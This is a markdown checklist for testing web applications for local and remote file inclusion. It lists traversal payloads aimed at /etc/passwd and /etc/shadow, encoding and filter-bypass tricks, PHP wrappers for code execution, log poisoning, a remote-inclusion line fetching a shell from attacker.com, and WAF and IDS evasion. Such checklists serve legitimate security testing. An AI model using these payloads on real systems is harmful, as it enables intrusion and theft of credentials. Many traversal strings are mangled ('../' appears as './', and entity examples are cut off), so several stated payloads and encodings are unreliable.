# 🔍 FILE INCLUSION TESTING CHECKLIST

 ## Comprehensive File Inclusion Testing

### 1 Local File Inclusion (LFI) Testing
    - Basic Directory Traversal:
      * Simple path traversal: ./../../etc/passwd
      * Encoded traversal sequences: %2e%2e%2f, %2e%2e/, .%2f, .%5c
      * Double encoding: %252e%252e%252f
      * Unicode/UTF-8 encoding: .%c0%af, .%c1%9c
      * Windows UNC paths: \\..\..\..\windows\system32\drivers\etc\hosts

    - Common LFI Targets:
      * System files: /etc/passwd, /etc/shadow, /etc/hosts
      * Configuration files: /etc/group, /etc/hostname, /etc/issue
      * Web server files: htaccess, httpd.conf, web.config
      * Log files: /var/log/apache2/access.log, /var/log/auth.log
      * Application files: config.php, database.ini, settings.json

    - Advanced LFI Techniques:
      * Null byte injection: ./../../etc/passwd%00
      * Path truncation: ./../../etc/passwdAAAAAAAAAA (with length limits)
      * Filter bypass with nested traversal: ...//....//....//etc/passwd
      * Using current directory: /./././etc/passwd
      * Using non-standard traversal: ../.../.../etc/passwd

### 2 Remote File Inclusion (RFI) Testing
    - Basic RFI Vectors:
      * Direct URL inclusion: http://attacker.com/shell.txt
      * Using protocol wrappers: http://, https://, ftp://
      * Data protocol: data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
      * Input wrapper: php://input (with POST data)
      * Output wrapper: php://filter/convert.base64-encode/resource=index.php

    - Protocol Wrapper Testing:
      * PHP filters: php://filter/convert.base64-encode/resource=file
      * Data wrapper: data://text/plain;base64,<base64>
      * Expect wrapper: expect://id (if enabled)
      * ZIP wrapper: zip://path.zip#file.txt
      * PHAR wrapper: phar://path.phar/file.txt

    - Advanced RFI Techniques:
      * DNS rebinding attacks for RFI
      * Using URL shorteners and redirectors
      * Cloud storage URLs (AWS S3, Google Cloud Storage)
      * CDN and proxy URLs for obfuscation
      * Using subdomains and wildcard DNS

### 3 Input Vector Testing
    - URL Parameter Testing:
      * Page parameters: ?page=about.php, ?file=header.html
      * Template parameters: ?template=default, ?view=user
      * Language parameters: ?lang=en, ?language=english
      * Include parameters: ?include=menu, ?load=sidebar
      * Document parameters: ?doc=manual.pdf, ?document=policy

    - Form Field Testing:
      * File upload fields with path manipulation
      * Search functionality with file inclusion
      * User profile picture paths
      * Document attachment fields
      * Import/export functionality

    - Header and Cookie Testing:
      * User-Agent header file inclusion
      * Referer header path manipulation
      * Cookie values used in file paths
      * Custom header injection
      * Session variable manipulation

### 4 Encoding and Obfuscation Techniques
    - URL Encoding:
      * Single encoding: %2e%2e%2f for ./
      * Double encoding: %252e%252e%252f
      * Mixed encoding: .%2f%2e%2e

    - Unicode Encoding:
      * UTF-8 overlong sequences: %c0%ae%c0%ae%c0%af for ./
      * UTF-16: %u002e%u002e%u002f
      * Unicode normalization attacks

    - Base64 Encoding:
      * Using base64 encoded strings in parameters
      * Wrapper with base64: php://filter/convert.base64-encode/resource=

    - HTML Entity Encoding:
      * & #x2e; for  (with and without semicolon)
      * & #46; for 
      * Mixed entity and direct characters

### 5 Server-Specific Testing
    - Apache Server Testing:
      * htaccess file inclusion
      * mod_rewrite and Alias directive issues
      * Log file inclusion (access.log, error.log)
      * Virtual host configuration access

    - Nginx Server Testing:
      * Log file inclusion (access.log, error.log)
      * FastCGI configuration issues
      * Location block bypasses
      * Root directive manipulation

    - IIS Server Testing:
      * web.config file inclusion
      * Log file inclusion (C:\inetpub\logs\LogFiles\*)
      * ApplicationHost.config access
      * Machine.config inclusion

    - PHP Configuration Testing:
      * allow_url_fopen and allow_url_include testing
      * open_basedir and safe_mode bypasses
      * disable_functions bypass attempts
      * memory_limit and file_uploads exploitation

### 6 Application Framework Testing
    - PHP Application Testing:
      * include(), require(), include_once(), require_once()
      * file_get_contents(), readfile(), fopen()
      * $_GET, $_POST, $_REQUEST parameter testing
      * Magic quotes and GPC bypass

    - Java Application Testing:
      * JSP include directives: <%@ include file="..." %>
      * JSP include actions: <jsp:include page="..." />
      * Servlet RequestDispatcher includes
      * Classpath resource inclusion

    - NET Application Testing:
      * ASP.NET Server.Execute() and Transfer()
      * User control inclusion (.ascx files)
      * Response.WriteFile() exploitation
      * VirtualPathProvider manipulation

    - Python Application Testing:
      * Django template includes
      * Flask render_template and send_file
      * File open and read operations
      * Import statement manipulation

### 7 Advanced File Inclusion Techniques
    - Log File Poisoning:
      * Inject PHP code into User-Agent, Referer, or other headers
      * Include the log file to execute code
      * Common log locations: /var/log/apache2/access.log

    - Session File Inclusion:
      * PHP session file inclusion (/tmp/sess_[id])
      * Inject code into session variables
      * Predict or brute-force session IDs

    - File Upload to Inclusion:
      * Upload a file with malicious content
      * Include the uploaded file via LFI
      * Bypass file type verification

    - PHP Wrappers for Code Execution:
      * php://input for direct code execution
      * data:// for embedded code
      * expect:// for command execution
      * zip:// for compressed file inclusion

### 8 Directory Traversal Depth Testing
    - Depth Variation Testing:
      * Minimal traversal: ./file
      * Moderate depth: ./../../file
      * Excessive depth: ./../../../../../../../file
      * Mixed depth with absolute paths
      * Relative path combinations

    - OS-Specific Path Testing:
      * Windows: .\..\windows\system32\drivers\etc\hosts
      * Linux/Unix: ./../../etc/passwd
      * Mixed OS path separators
      * Drive letter manipulation (Windows)

### 9 Filter Bypass Techniques
    - Blacklist Bypass:
      * Case variation: ./../../Etc/PaSsWd
      * Using non-standard characters
      * Double file extensions: file.php.txt
      * Using environment variables
      * Wildcard characters: /etc/p*sswd

    - Whitelist Bypass:
      * Path traversal after whitelisted directory
      * Using symbolic links
      * URL encoding in whitelist checks
      * Protocol-relative URLs

    - WAF Bypass Techniques:
      * IP address encoding: 0x7f000001 for 127.0.0.1
      * Hostname obfuscation
      * Chunked transfer encoding
      * HTTP parameter pollution

### 10 Context-Aware Testing
    - Web Application Context:
      * CMS template inclusion (WordPress, Joomla, Drupal)
      * E-commerce product image inclusion
      * Blog attachment file inclusion
      * Forum avatar and attachment handling

    - API Context:
      * REST API file path parameters
      * GraphQL file inclusion fields
      * SOAP attachment handling
      * File download endpoints

    - Mobile Application Context:
      * WebView file inclusion
      * Cordova/PhoneGap file protocols
      * React Native file handling
      * Mobile API file endpoints

### 11 Defense Bypass Testing
    - Input Validation Bypass:
      * Null byte injection before validation
      * Multiple parameter exploitation
      * Request splitting attacks
      * Content-Type manipulation

    - Security Control Testing:
      * Web Application Firewall (WAF) evasion
      * Intrusion Detection System (IDS) bypass
      * File integrity monitoring circumvention
      * Security header manipulation

#### Testing Tools and Methodologies:
    Manual Testing Tools:
    - Burp Suite with file inclusion scanner
    - OWASP ZAP with directory traversal plugin
    - Custom Python scripts for path fuzzing
    - Browser developer tools for client-side testing

    Automated Testing Tools:
    - FFuF (Fuzz Faster U Fool) with file inclusion wordlists
    - Dirb/Dirbuster with traversal payloads
    - SQLMap with file read capabilities
    - Nuclei templates for file inclusion

    Specialized Testing Tools:
    - LFI suite tools (LFISuite, LFI-files)
    - RFI exploitation frameworks
    - Custom wrapper testing scripts
    - File inclusion vulnerability scanners

    Test Case Examples:
    - Basic LFI: ./../../etc/passwd
    - Encoded LFI: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
    - RFI: http://attacker.com/shell.txt
    - PHP Wrapper: php://filter/convert.base64-encode/resource=index.php
    - Data URI: data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

    Testing Methodology:
    1. Identify all file inclusion parameters
    2. Test basic directory traversal
    3. Attempt protocol wrapper inclusion
    4. Test encoding and obfuscation techniques
    5. Verify server-specific vulnerabilities
    6. Test framework-specific inclusion methods
    7. Attempt defense bypass techniques
    8. Document successful exploitation paths